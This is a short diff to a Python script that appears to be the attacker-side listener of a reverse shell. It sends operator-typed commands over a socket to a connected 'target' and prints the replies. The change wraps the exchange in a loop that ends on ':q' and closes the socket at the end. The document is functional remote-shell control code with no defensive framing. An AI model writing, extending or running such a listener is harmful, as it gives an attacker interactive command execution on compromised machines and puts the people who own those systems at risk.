@@ -4,13 +4,17 @@
 
 import socket
 from termcolor import colored
+import subprocess
 
 def shell():
-    command =input("Shell#~%s: " % str(ip))
-    target.send(command.encode())
-    message = target.recv(1024)
-    print(message.decode())
-
+    while True:
+        command = input("Shell#~%s: " % str(ip))
+        target.send(command.encode())
+        if command == ':q':
+            break
+        else:
+            result = target.recv(1024)
+            print(result.decode())
 
 def server():
     global sock
@@ -27,3 +31,4 @@ def server():
 
 server()
 shell()
+sock.close()
